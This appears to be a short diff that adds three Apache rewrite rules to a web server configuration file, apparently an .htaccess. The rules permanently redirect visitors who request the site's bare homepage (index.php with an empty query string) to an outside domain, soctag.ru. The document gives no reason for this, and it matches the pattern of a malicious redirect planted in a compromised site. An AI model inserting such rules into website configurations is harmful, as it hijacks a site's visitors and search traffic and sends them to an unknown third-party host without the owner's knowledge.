@@ -1,0 +1,3 @@
+RewriteCond %{REQUEST_URI} /index.php
+RewriteCond %{QUERY_STRING} ^\z
+RewriteRule ^(.*)$ https://soctag.ru/? [R=301,L]
